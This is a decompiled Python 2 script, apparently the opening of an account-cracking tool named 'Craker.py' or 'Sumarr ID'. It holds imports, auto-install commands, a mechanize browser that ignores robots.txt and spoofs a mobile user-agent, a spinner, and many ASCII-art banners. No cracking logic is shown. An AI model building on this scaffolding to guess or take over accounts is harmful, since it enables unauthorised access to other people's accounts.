# DECRYPTED BY xXx_not_found_xXx
# Github : https://github.com/hamalord4444
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: Sumarr ID
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Craker.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;91m||', '\x1b[1;92m//', '\x1b[1;93m$$', '\x1b[1;94m--', '\x1b[1;95m$$', '\x1b[1;96m--', '\x1b[1;97m\\', '\x1b[1;91m||', '\x1b[1;92m//', '\x1b[1;93m$$', '\x1b[1;94m--', '\x1b[1;95m$$', '\x1b[1;96m--', '\x1b[1;97m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;95mYayanXD\x1b[1;94m:( ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;93mSelamat Tinggal..'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0003)


logo = '\n\x1b[1;94m$$\\     $$\\ $$\\   $$\\ $$\\   $$\\ $$$$$$$$\\ \n\x1b[1;94m\\$$\\   $$  |$$ |  $$ |$$$\\  $$ |\\____$$  |\n\x1b[1;94m \\$$\\ $$  / $$ |  $$ |$$$$\\ $$ |    $$  / \n\x1b[1;95m  \\$$$$  /  $$$$$$$$ |$$ $$\\$$ |   $$  /  \n\x1b[1;95m   \\$$  /   \\_____$$ |$$ \\$$$$ |  $$  /   \n\x1b[1;95m    $$ |          $$ |$$ |\\$$$ | $$  /    \n\x1b[1;92m    $$ | YayanXD  $$ |$$ | \\$$ |$$$$$$$$\\ \n\x1b[1;92m    \\__|  V.05    \\__|\\__|  \\__|\\________|\n\x1b[1;94m>>========================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>========================================\n'
logo2 = '\n\x1b[1;96m        _______        \x1b[1;93m        _______    \n\x1b[1;96m    .adOOOOOOOOOba.    \x1b[1;93m     .adOOOOOOOOOba.\n\x1b[1;96m   dOOOOOOOOOOOOOOOb   \x1b[1;93m    dOOOOOOOOOOOOOOOb \n\x1b[1;96m  dOOOOOOOOOOOOOOOOOb  \x1b[1;93m   dOOOOOOOOOOOOOOOOOb\n\x1b[1;96m dOOOOOOOOOOOOOOOOOOOb \x1b[1;93m  dOOOOOOOOOOOOOOOOOOOb\n\x1b[1;96m|OOOOOOOOOOOOOOOOOOOOO|\x1b[1;93m |OOOOOOOOOOOOOOOOOOOOO|\n\x1b[1;96mOP\'~"YOOOOOOOOOOOP"~`YO\x1b[1;93m OP\'~"YOOOOOOOOOOOP"~`YO\n\x1b[1;96mOO     `YOOOOOP\'     OO\x1b[1;93m OO     `YOOOOOP\'     OO \n\x1b[1;96mOOb   \xe2\x97\x8f  `OOO\'  \xe2\x97\x8f   dO\x1b[1;93m  OOb   \xe2\x97\x8f  `OOO\'  \xe2\x97\x8f   dO\n\x1b[1;96mYOOo      OOO      oOOP\x1b[1;93m YOOo      OOO      oOOP\n\x1b[1;96m`OOOo     OOO     oOOO\'\x1b[1;93m `OOOo     OOO     oOOO\'\n\x1b[1;96m `OOOb._,dOOOb._,dOOO\' \x1b[1;93m  `OOOb._,dOOOb._,dOOO\'\n\x1b[1;96m  `OOOOOOOOOOOOOOOOO\'  \x1b[1;93m   `OOOOOOOOOOOOOOOOO\'\n\x1b[1;96m   OOOOOOOoOoOOOOOOO   \x1b[1;93m    OOOOOOOoOoOOOOOOO \n\x1b[1;96m   YOOOOOOOOOOOOOOOP   \x1b[1;93m    YOOOOOOOOOOOOOOOP\n\x1b[1;96m   `OOOOOI```IOOOOO\'   \x1b[1;93m    `OOOOOI```IOOOOO\'\n\x1b[1;96m    `OOOOI,,,IOOOO\'    \x1b[1;93m     `OOOOI,,,IOOOO\'   \n\x1b[1;96m     `OOOOOOOOOOO\'     \x1b[1;93m      `OOOOOOOOOOO\'\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo3 = '\n\x1b[1;93m /$$$$$$$$        /$$                          \n\x1b[1;95m|__  $$__/       | $$                          \n\x1b[1;93m   | $$  /$$$$$$ | $$   /$$  /$$$$$$  /$$$$$$$ \n\x1b[1;95m   | $$ /$$__  $$| $$  /$$/ /$$__  $$| $$__  $$\n\x1b[1;93m   | $$| $$  \\ $$| $$$$$$/ | $$$$$$$$| $$  \\ $$\n\x1b[1;95m   | $$| $$  | $$| $$_  $$ | $$_____/| $$  | $$\n\x1b[1;93m   | $$|  $$$$$$/| $$ \\  $$|  $$$$$$$| $$  | $$\n\x1b[1;95m   |__/ \\______/ |__/  \\__/ \\_______/|__/  |__/\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo4 = '\n\x1b[1;96m _    _ _____ _     _____ ________  ___ _____ \n\x1b[1;92m| |  | |  ___| |   /  __ \\  _  |  \\/  ||  ___|\n\x1b[1;92m| |  | | |__ | |   | /  \\/ | | | .  . || |__  \n\x1b[1;96m| |/\\| |  __|| |   | |   | | | | |\\/| ||  __| \n\x1b[1;92m\\  /\\  / |___| |___| \\__/\\ \\_/ / |  | || |___ \n\x1b[1;96m \\/  \\/\\____/\\_____/\\____/\\___/\\_|  |_/\\____/ \n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo5 = '\n\x1b[1;93m           _,.-----.,_\n\x1b[1;96m       ,-~           ~-.\n\x1b[1;93m      ,^___           ___^.\n\x1b[1;96m     Y  ,--._   I    _.--.  Y\n\x1b[1;96m    | Y     ~-. | ,-~     Y |\n\x1b[1;93m    | |        }:{        | |\n\x1b[1;96m    j l       / | \\       ! l\n\x1b[1;93m .-~  (__,.--" .^. "--.,__)  ~-.\n\x1b[1;96m(           / / | \\ \\           )\n\x1b[1;93m \\.____,   ~  \\/"\\/  ~   .____,/\n\x1b[1;96m  ^.____                 ____.^\n\x1b[1;93m     | |T ~\\  !   !  /~ T| |\n\x1b[1;96m     | |l   _ _ _ _ _   !| |\n\x1b[1;93m     | l \\/V V V V V V\\/ j |\n\x1b[1;93m     l  \\ \\|_|_|_|_|_|/ /  !\n\x1b[1;96m      \\  \\[T T T T T TI/  /\n\x1b[1;96m       \\  `^-^-^-^-^-^\'  /\n\x1b[1;93m        \\               /\n\x1b[1;93m         \\.           ,/\n\x1b[1;93m           "^-.___,-^"\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo6 = '\n\x1b[1;93m                     :::!~!!!!!:.\n\x1b[1;96m                  .xUHWH!! !!?M88WHX:.\n\x1b[1;93m                .X*#M@$!!  !X!M$$$$$$WWx:.\n\x1b[1;96m               :!!!!!!?H! :!$!$$$$$$$$$$8X:\n\x1b[1;93m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:\n\x1b[1;96m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!\n\x1b[1;93m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!\n\x1b[1;96m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!\n\x1b[1;93m               ~?WuxiW*`   `"#$$$$8!!!!??!!!\n\x1b[1;96m             :X- M$$$$       `"T#$T~!8$WUXU~\n\x1b[1;93m            :%`  ~#$$$m:        ~!~ ?$$$$$$\n\x1b[1;96m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"\n\x1b[1;93m.....   -~~:<` !    ~?T#$$@@W@*?$$      /`\n\x1b[1;96mW$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :\n\x1b[1;93m#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`\n\x1b[1;96m:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~\n\x1b[1;93m.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `\n\x1b[1;96mWi.~!X$?!-~    : ?$$$B$Wu("**$RM!\n\x1b[1;93m$R@i.~~ !     :   ~$$$$$B$$en:``\n\x1b[1;96m?MXT@Wx.~    :     ~"##*$$$$M~\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo7 = '\n\x1b[1;93m         _,.-------.,_\n\x1b[1;93m     ,;~\'             \'~;,\n\x1b[1;93m   ,;                     ;,\n\x1b[1;92m  ;                         ;\n\x1b[1;93m ,\'                         \',\n\x1b[1;92m,;                           ;,\n\x1b[1;92m; ;      .           .      ; ;\n\x1b[1;93m| ;   ______       ______   ; |\n\x1b[1;92m|  `/~"     ~" . "~     "~\'  \n\x1b[1;93m|  ~  ,-~~~^~, | ,~^~~~-,  ~  |\n\x1b[1;92m |   |        }:{        |    |\n\x1b[1;93m |   l       / | \\       !   |\n\x1b[1;92m .~  (__,.--" .^. "--.,__)  ~.\n\x1b[1;93m |     ---;\' / | \\ `;---    |\n\x1b[1;92m  \\__.       \\/^\\/       .__/\n\x1b[1;93m   V| \\                 / |V\n\x1b[1;92m    | |T~\\___!___!___/~T| |\n\x1b[1;93m    | |`IIII_I_I_I_IIII\'| |\n\x1b[1;92m    |  \\,III I I I III,/  |\n\x1b[1;93m     \\   `~~~~~~~~~~\'    /\n\x1b[1;93m       \\   .       .   /\n\x1b[1;93m         \\.    ^    ./\n\x1b[1;92m           ^~~~^~~~^\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo8 = '\n\x1b[1;93m                     :::!~!!!!!:.\n\x1b[1;96m                  .xUHWH!! !!?M88WHX:.\n\x1b[1;93m                .X*#M@$!!  !X!M$$$$$$WWx:.\n\x1b[1;96m               :!!!!!!?H! :!$!$$$$$$$$$$8X:\n\x1b[1;93m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:\n\x1b[1;96m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!\n\x1b[1;93m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!\n\x1b[1;96m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!\n\x1b[1;93m               ~?WuxiW*`   `"#$$$$8!!!!??!!!\n\x1b[1;96m             :X- M$$$$       `"T#$T~!8$WUXU~\n\x1b[1;93m            :%`  ~#$$$m:        ~!~ ?$$$$$$\n\x1b[1;96m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"\n\x1b[1;93m.....   -~~:<` !    ~?T#$$@@W@*?$$      /`\n\x1b[1;96mW$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :\n\x1b[1;93m#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`\n\x1b[1;96m:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~\n\x1b[1;93m.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `\n\x1b[1;96mWi.~!X$?!-~    : ?$$$B$Wu("**$RM!\n\x1b[1;93m$R@i.~~ !     :   ~$$$$$B$$en:``\n\x1b[1;96m?MXT@Wx.~    :     ~"##*$$$$M~\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo9 = '\n\x1b[1;96m   .... NO! ...                  ... MNO! ...\n\x1b[1;93m   ..... MNO!! ...................... MNNOO! ...\n\x1b[1;96m ..... MMNO! ......................... MNNOO!! .\n\x1b[1;93m..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .\n\x1b[1;96m ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....\n\x1b[1;93m    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...\n\x1b[1;96m   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....\n\x1b[1;93m   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...\n\x1b[1;96m    ....... MMMMM..    OPPMMP    .,OMI! ....\n\x1b[1;93m     ...... MMMM::   o.,OPMP,.o   ::I!! ...\n\x1b[1;96m         .... NNM:::.,,OOPM!P,.::::!! ....\n\x1b[1;93m          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....\n\x1b[1;96m         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....\n\x1b[1;93m           .. MMMMMNNOOMMNNIIIPPPOO!! ......\n\x1b[1;96m          ...... MMMONNMMNNNIIIOO!..........\n\x1b[1;93m       ....... MN MOMMMNNNIIIIIO! OO ..........\n\x1b[1;96m    ......... MNO! IiiiiiiiiiiiI OOOO ...........\n\x1b[1;93m  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........\n\x1b[1;96m   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........\n\x1b[1;93m   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........\n\x1b[1;96m      ...... OO! ................. ON! .......\n\x1b[1;93m         ................................\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo10 = '\n\x1b[1;92m ____               /))\n\x1b[1;93m|;;/;:\\____\\|_____/:/ <\n\x1b[1;92m  | <:::::::::::::::> |\n\x1b[1;93m   \\ ##:::::::::::## /\n\x1b[1;92m   /:::/~\\:::::/~\\:::\x1b[1;91m  |##:| @ |:::| @ |:##|\n\x1b[1;96m  |{__}\\_/ %%% \\_/::::|\n\x1b[1;93m  |###:::::\\_/:::::###|\n\x1b[1;96m   \\:::::\\__|__/:::::/\n\x1b[1;93m     \\##::,___,::##/\n\x1b[1;96m       /@@:::::@@\x1b[1;93m     /###@::@@::###\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo11 = '\n\x1b[1;93ma          a\n\x1b[1;93m             aaa        aaa\n\x1b[1;96m            aaaaaaaaaaaaaaaa\n\x1b[1;93m           aaaaaaaaaaaaaaaaaa\n\x1b[1;93m          aaaaafaaaaaaafaaaaaa\n\x1b[1;96m          aaaaaaaaaaaaaaaaaaaa\n\x1b[1;93m           aaaaaaaaaaaaaaaaaa\n\x1b[1;93m            aaaaaaa  aaaaaaa\n\x1b[1;96m             aaaaaaaaaaaaaa\n\x1b[1;93m  a         aaaaaaaaaaaaaaaa\n\x1b[1;96m aaa       aaaaaaaaaaaaaaaaaa\n\x1b[1;93m aaa      aaaaaaaaaaaaaaaaaaaa\n\x1b[1;92m aaa     aaaaaaaaaaaaaaaaaaaaaa\n\x1b[1;93m aaa    aaaaaaaaaaaaaaaaaaaaaaaa\n\x1b[1;96m  aaa   aaaaaaaaaaaaaaaaaaaaaaaa\n\x1b[1;93m  aaa   aaaaaaaaaaaaaaaaaaaaaaaa\n\x1b[1;96m  aaa    aaaaaaaaaaaaaaaaaaaaaa\n\x1b[1;93m   aaa    aaaaaaaaaaaaaaaaaaaa\n\x1b[1;93m    aaaaaaaaaaaaaaaaaaaaaaaaaa\n\x1b[1;96m     aaaaaaaaaaaaaaaaaaaaaaaaa\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo12 = '\n\x1b[1;93m                       ,ood8888booo,\n\x1b[1;92m                    ,oda8a888a888888bo,\n\x1b[1;96m                 ,od88888888aa888aa88a8bo,\n\x1b[1;92m               ,da8888aaaa88a888aaaa8a8a88b,\n\x1b[1;96m              ,oa888aaaa8aa8888aaa8aa8a8a88o,\n\x1b[1;92m             ,88888aaaaaa8aa8888a8aa8aa888a88,\n\x1b[1;96m             8888a88aaaaaa8a88aa8888888a888888\n\x1b[1;92m             888aaaa88aa8aaaa8888; ;8888a88888\n\x1b[1;96m             Y888a888a888a8888;\'   ;888888a88Y\n\x1b[1;92m              Y8a8aa8a888a88\'      ,8aaa8888Y\n\x1b[1;96m               Y8a8aa8aa8888;     ;8a8aaa88Y\n\x1b[1;92m                `Y88aa8888;\'      ;8aaa88Y\'\n\x1b[1;96m        ,,;;;;;;;;\'\'\'\'\'\'\'         ;8888Y\'\n\x1b[1;96m     ,,;                         ,888P\n\x1b[1;92m   ,;  ,;,                      ;""\n\x1b[1;96m  ;       ;          ,    ,    ,;\n\x1b[1;92m ;  ;,    ;     ,;;;;;   ;,,,  ;\n\x1b[1;96m;  ; ;  ,\' ;  ,;      ;  ;   ;  ;\n\x1b[1;92m; ;  ; ;  ;  \'        ; ,\'    ;  ;\n\x1b[1;92m`;\'  ; ;  \'; ;,       ; ;      ; \',\n\x1b[1;96m     ;  ;,  ;,;       ;  ;,     ;;;\n\x1b[1;92m      ;,,;             ;,,;\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo13 = '\n\x1b[1;95m /$$$$$$                 /$$ /$$          \n\x1b[1;95m|_  $$_/                | $$|__/          \n\x1b[1;95m  | $$   /$$$$$$$   /$$$$$$$ /$$  /$$$$$$ \n\x1b[1;95m  | $$  | $$__  $$ /$$__  $$| $$ |____  $$\n\x1b[1;96m  | $$  | $$  \\ $$| $$  | $$| $$  /$$$$$$$\n\x1b[1;96m  | $$  | $$  | $$| $$  | $$| $$ /$$__  $$\n\x1b[1;96m /$$$$$$| $$  | $$|  $$$$$$$| $$|  $$$$$$$\n\x1b[1;96m|______/|__/  |__/ \\_______/|__/ \\_______/\n\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo14 = '\n\x1b[1;94m$$$$$$$$\\        $$\\                         \n\x1b[1;94m$$  _____|       $$ |                        \n\x1b[1;94m$$ |    $$$$$$\\  $$ | $$$$$$\\  $$\\  $$\\  $$\\ \n\x1b[1;94m$$$$$\\ $$  __$$\\ $$ |$$  __$$\\ $$ | $$ | $$ |\n\x1b[1;95m$$  __|$$ /  $$ |$$ |$$ /  $$ |$$ | $$ | $$ |\n\x1b[1;95m$$ |   $$ |  $$ |$$ |$$ |  $$ |$$ | $$ | $$ |\n\x1b[1;95m$$ |   \\$$$$$$  |$$ |\\$$$$$$  |\\$$$$$\\$$$$  |\n\x1b[1;95m\\__|    \\______/ \\__| \\______/  \\_____\\____/ \n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo15 = '\n\x1b[1;91m$$$$$$\\                 $$\\           \n\x1b[1;91m\\_$$  _|                $$ |          \n\x1b[1;91m  $$ |  $$$$$$$\\   $$$$$$$ | $$$$$$\\  \n\x1b[1;91m  $$ |  $$  __$$\\ $$  __$$ |$$  __$$\\ \n\x1b[1;97m  $$ |  $$ |  $$ |$$ /  $$ |$$ /  $$ |\n\x1b[1;97m  $$ |  $$ |  $$ |$$ |  $$ |$$ |  $$ |\n\x1b[1;97m$$$$$$\\ $$ |  $$ |\\$$$$$$$ |\\$$$$$$  |\n\x1b[1;97m\\______|\\__|  \\__| \\_______| \\______/ \n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo16 = '\n\x1b[1;93m /$$$$$$$           /$$       /$$          \n\x1b[1;94m| $$__  $$         | $$      |__/          \n\x1b[1;93m| $$  \\ $$ /$$$$$$ | $$   /$$ /$$  /$$$$$$$\n\x1b[1;94m| $$$$$$$/|____  $$| $$  /$$/| $$ /$$_____/\n\x1b[1;93m| $$____/  /$$$$$$$| $$$$$$/ | $$|  $$$$$$ \n\x1b[1;94m| $$      /$$__  $$| $$_  $$ | $$ \\____  $$\n\x1b[1;93m| $$     |  $$$$$$$| $$ \\  $$| $$ /$$$$$$$/\n\x1b[1;94m|__/      \\_______/|__/  \\__/|__/|_______/ \n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo17 = '\n\x1b[1;94m /$$      /$$\x1b[1;97m           /$$           /$$\n\x1b[1;94m| $$$    /$$$\x1b[1;91m          | $$          |__/\n\x1b[1;94m| $$$$  /$$$$\x1b[1;97m  /$$$$$$ | $$  /$$$$$$  /$$\n\x1b[1;94m| $$ $$/$$ $$\x1b[1;91m |____  $$| $$ |____  $$| $$\n\x1b[1;97m| $$  $$$| $$  /$$$$$$$| $$  /$$$$$$$| $$\n\x1b[1;91m| $$\\  $ | $$ /$$__  $$| $$ /$$__  $$| $$\n\x1b[1;97m| $$ \\/  | $$|  $$$$$$$| $$|  $$$$$$$| $$\n\x1b[1;91m|__/     |__/ \\_______/|__/ \\_______/|__/\n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo18 = '\n\x1b[1;94m /$$$$$$$   /$$$$$$  /$$       /$$$$$$$ \n\x1b[1;94m| $$__  $$ /$$__  $$| $$      | $$__  $$\n\x1b[1;94m| $$  \\ $$| $$  \\__/| $$      | $$  \\ $$\n\x1b[1;94m| $$$$$$$ | $$ /$$$$| $$      | $$  | $$\n\x1b[1;94m| $$__  $$| $$|_  $$| $$      | $$  | $$\n\x1b[1;94m| $$  \\ $$| $$  \\ $$| $$      | $$  | $$\n\x1b[1;94m| $$$$$$$/|  $$$$$$/| $$$$$$$$| $$$$$$$/\n\x1b[1;94m|_______/  \\______/ |________/|_______/ \n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
logo19 = '\n\x1b[1;94m __    __ \x1b[1;91m  ______    ______  \n\x1b[1;94m/  |  /  |\x1b[1;97m /      \\  /      \\ \n\x1b[1;94m$$ |  $$ |\x1b[1;91m/$$$$$$  |/$$$$$$  |\n\x1b[1;94m$$ |  $$ |\x1b[1;97m$$ \\__$$/ $$ |__$$ |\n\x1b[1;91m$$ |  $$ |$$      \\ $$    $$ |\n\x1b[1;97m$$ |  $$ | $$$$$$  |$$$$$$$$ |\n\x1b[1;91m$$ \\__$$ |/  \\__$$ |$$ |  $$ |\n\x1b[1;97m$$    $$/ $$    $$/ $$ |  $$ |\n\x1b[1;91m $$$$$$/   $$$$$$/  $$/   $$/ \n\x1b[1;94m>>============================================\n\x1b[1;92m>> \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;93mYayanXD\n\x1b[1;92m>> \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;93mgithub.com/Yayan-XD\n\x1b[1;92m>> \x1b[1;95mFacebook \x1b[1;91m: \x1b[1;93mMoch Yayan Juan Alvredo XD.\n\x1b[1;94m>>============================================\n'
